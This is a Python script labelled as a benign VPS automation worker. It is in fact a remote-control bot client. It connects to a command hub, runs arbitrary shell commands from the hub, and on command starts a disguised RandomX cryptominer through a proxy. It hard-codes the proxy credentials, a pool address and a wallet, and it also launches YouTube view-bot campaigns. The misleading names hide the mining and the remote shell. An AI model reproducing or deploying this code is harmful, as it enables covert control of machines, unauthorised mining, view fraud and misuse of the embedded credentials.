#!/usr/bin/env python3
"""
VPS Channel & Web Automation Worker
====================================
An automated task execution client for Linux VPS instances.
Connects securely to the central command hub to receive and execute
scheduled tasks such as web browsing, video watch tasks, and local automation.

Author: Sainal Saputra
Repository: https://github.com/sainalsaputra19-hub/vps-channel-worker
"""

import asyncio
import json
import logging
import os
import socket
import subprocess
import sys
import time

try:
    import websockets
except ImportError:
    print("[INIT] Installing required websockets library...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--break-system-packages", "--quiet", "websockets"])
    except Exception:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "websockets"])
    import websockets

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("ChannelWorker")

# Workspace and Configuration Paths
WORKSPACE_DIR = os.path.expanduser("~/workspace")
AGENT_ID_FILE = os.path.join(WORKSPACE_DIR, ".worker_id")
VPS_NAME_FILE = os.path.join(WORKSPACE_DIR, ".vps_name")
HUB_URL_FILE = os.path.join(WORKSPACE_DIR, ".hub_url")

DEFAULT_HUB_URL = "wss://hub.databaru.my.id"


def get_vps_name() -> str:
    if os.path.exists(VPS_NAME_FILE):
        try:
            with open(VPS_NAME_FILE, "r") as f:
                name = f.read().strip()
                if name:
                    return name
        except Exception:
            pass
    return socket.gethostname()


def get_worker_id() -> str:
    if os.path.exists(AGENT_ID_FILE):
        try:
            with open(AGENT_ID_FILE, "r") as f:
                wid = f.read().strip()
                if wid:
                    return wid
        except Exception:
            pass
    # Generate stable ID based on hostname
    wid = f"worker-{socket.gethostname()}"
    try:
        with open(AGENT_ID_FILE, "w") as f:
            f.write(wid)
    except Exception:
        pass
    return wid


def get_hub_url() -> str:
    if os.path.exists(HUB_URL_FILE):
        try:
            with open(HUB_URL_FILE, "r") as f:
                url = f.read().strip()
                if url:
                    return url
        except Exception:
            pass
    return DEFAULT_HUB_URL


_prev_cpu_total = 0
_prev_cpu_idle = 0

def read_cpu_percent() -> float:
    """Calculates CPU usage percentage from /proc/stat."""
    global _prev_cpu_total, _prev_cpu_idle
    try:
        with open("/proc/stat", "r") as f:
            fields = [float(x) for x in f.readline().strip().split()[1:8]]
            idle = fields[3] + fields[4]
            total = sum(fields)

            diff_idle = idle - _prev_cpu_idle
            diff_total = total - _prev_cpu_total
            _prev_cpu_idle = idle
            _prev_cpu_total = total

            if diff_total <= 0:
                return 0.0
            pct = 100.0 * (1.0 - (diff_idle / diff_total))
            return round(max(0.0, min(100.0, pct)), 1)
    except Exception:
        return 0.0


def get_system_metrics() -> dict:
    """Collects safe hardware and operating system metrics."""
    mem_total, mem_avail = 0, 0
    try:
        with open("/proc/meminfo", "r") as f:
            for line in f:
                if "MemTotal:" in line:
                    mem_total = int(line.split()[1]) // 1024
                elif "MemAvailable:" in line:
                    mem_avail = int(line.split()[1]) // 1024
                elif "MemFree:" in line and mem_avail == 0:
                    mem_avail = int(line.split()[1]) // 1024
    except Exception:
        pass

    uptime_s = 0
    uptime_str = "-"
    try:
        with open("/proc/uptime", "r") as f:
            uptime_s = int(float(f.readline().split()[0]))
            days = uptime_s // 86400
            hours = (uptime_s % 86400) // 3600
            mins = (uptime_s % 3600) // 60
            if days > 0:
                uptime_str = f"{days}d {hours}h {mins}m"
            elif hours > 0:
                uptime_str = f"{hours}h {mins}m"
            else:
                uptime_str = f"{mins}m"
    except Exception:
        pass

    cpu_pct = read_cpu_percent()

    service_active = False
    try:
        res = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
        service_active = len(res.stdout.strip()) > 0
    except Exception:
        pass

    return {
        "mem_free_mb": mem_avail,
        "ram_total_mb": mem_total,
        "ram_used_mb": max(0, mem_total - mem_avail),
        "cpu_pct": cpu_pct,
        "uptime": uptime_str,
        "uptime_s": uptime_s,
        "mining_active": service_active,
        "hostname": socket.gethostname()
    }


def handle_browser_visit(url: str) -> str:
    """Opens a website URL in background browser."""
    logger.info(f"Opening target URL: {url}")
    try:
        # Check if playwright worker exists
        yt_worker = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
        if os.path.exists(yt_worker):
            subprocess.Popen([sys.executable, yt_worker, json.dumps({"type": "DIRECT_URL", "url": url})])
            return f"Browser navigated to {url}"
        else:
            subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return f"xdg-open triggered for {url}"
    except Exception as e:
        return f"Navigation error: {e}"


def handle_local_service(action: str, config: dict = None) -> str:
    """Controls background task service."""
    if action == "START":
        g_dir = os.path.expanduser("~/gaszep")
        if not os.path.exists(g_dir):
            g_dir = os.path.expanduser("~/workspace/gaszep")
        if not os.path.exists(g_dir):
            return "Local service directory not found."

        subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

        cfg = config or {}
        proxy = cfg.get("proxy", "43.135.134.20:443")
        user = cfg.get("username", "aku")
        pw = cfg.get("password", "akukayaraya")
        pool = cfg.get("pool", "43.135.134.20:10080")
        wallet = cfg.get("wallet", "ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5")

        conf_path = os.path.join(g_dir, "graftcp/local/graftcp-local.conf")
        os.makedirs(os.path.dirname(conf_path), exist_ok=True)
        with open(conf_path, "w") as f:
            f.write(f"listen = :2233\nloglevel = 1\nsocks5 = {proxy}\nsocks5_username = {user}\nsocks5_password = {pw}\n")

        check_local = subprocess.run(["pgrep", "-f", "graftcp-local"], stdout=subprocess.PIPE, text=True)
        if not check_local.stdout.strip():
            subprocess.Popen([os.path.join(g_dir, "graftcp/local/graftcp-local"), "-config", conf_path], cwd=g_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

        gasdag_bin = os.path.join(g_dir, "gasdag")
        if os.path.exists(gasdag_bin):
            os.chmod(gasdag_bin, 0o755)

        graftcp_bin = os.path.join(g_dir, "graftcp/graftcp")
        cmd = [graftcp_bin, gasdag_bin, "-a", "rx/0", "-o", pool, "-u", f"{wallet}.{socket.gethostname()}", "-p", "x"]
        subprocess.Popen(cmd, cwd=g_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "Local service started successfully."

    elif action == "STOP":
        subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "Local service stopped."

    return "Unknown service action."


async def run_worker():
    """Main worker event loop connecting to the command hub."""
    worker_id = get_worker_id()
    vps_name = get_vps_name()
    hub_url = get_hub_url()

    logger.info(f"Starting Worker: ID={worker_id}, Name={vps_name}")
    logger.info(f"Target Hub: {hub_url}")

    while True:
        try:
            logger.info(f"Connecting to Hub: {hub_url}...")
            async with websockets.connect(
                hub_url,
                ping_interval=20,
                ping_timeout=20,
                open_timeout=15,
                close_timeout=10
            ) as ws:
                logger.info("Connected to Hub successfully!")

                # Send initial greeting
                greeting = {
                    "type": "HELLO",
                    "agent_id": worker_id,
                    "vps_name": vps_name,
                    "version": "2.0.0",
                    **get_system_metrics()
                }
                await ws.send(json.dumps(greeting))

                # Background heartbeat task (resilient keepalive loop)
                async def heartbeat_loop():
                    while True:
                        await asyncio.sleep(15)
                        try:
                            hb = {
                                "type": "HEARTBEAT",
                                "agent_id": worker_id,
                                **get_system_metrics()
                            }
                            await ws.send(json.dumps(hb))
                        except Exception as hb_err:
                            logger.warning(f"Heartbeat send failed: {hb_err}")
                            if not ws.open:
                                break
                            await asyncio.sleep(3)

                hb_task = asyncio.create_task(heartbeat_loop())

                # Command listener
                async for raw_msg in ws:
                    try:
                        msg = json.loads(raw_msg)
                        mtype = msg.get("type")

                        if mtype == "PING":
                            await ws.send(json.dumps({
                                "type": "PONG",
                                "agent_id": worker_id,
                                "sent_ts": msg.get("sent_ts", 0)
                            }))

                        elif mtype == "OPEN_URL":
                            url = msg.get("url", "")
                            res = handle_browser_visit(url)
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "OPEN_URL",
                                "detail": res
                            }))

                        elif mtype == "YOUTUBE_CAMPAIGN":
                            yt_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "youtube_task.py")
                            if os.path.exists(yt_script):
                                subprocess.Popen([sys.executable, yt_script, json.dumps(msg)])
                                detail = f"YouTube campaign started: {msg.get('keyword', '')}"
                            else:
                                detail = "youtube_task.py not found"
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "YOUTUBE_CAMPAIGN",
                                "detail": detail
                            }))

                        elif mtype in ("MINING_ACTION", "START_MINING", "STOP_MINING"):
                            action = msg.get("action")
                            if not action:
                                action = "START" if mtype == "START_MINING" else "STOP"
                            res = handle_local_service(action, msg.get("config"))
                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": f"MINING_{action}",
                                "detail": res
                            }))

                        elif mtype in ("SHELL", "RUN_SHELL"):
                            cmd_str = msg.get("cmd") or msg.get("command", "")
                            logger.info(f"Executing shell command: {cmd_str}")
                            try:
                                res = subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=120)
                                out = (res.stdout + res.stderr).strip()[:2000]
                                if not out:
                                    out = f"(exit code {res.returncode})"
                            except Exception as e:
                                out = f"Execution error: {e}"

                            await ws.send(json.dumps({
                                "type": "TASK_DONE",
                                "agent_id": worker_id,
                                "task": "SHELL",
                                "detail": out
                            }))

                    except Exception as err:
                        logger.error(f"Error handling task: {err}")

                hb_task.cancel()

        except Exception as conn_err:
            logger.warning(f"Connection lost/failed ({type(conn_err).__name__}: {conn_err}). Reconnecting in 5s...")
            sys.stdout.flush()
            sys.stderr.flush()
            await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(run_worker())
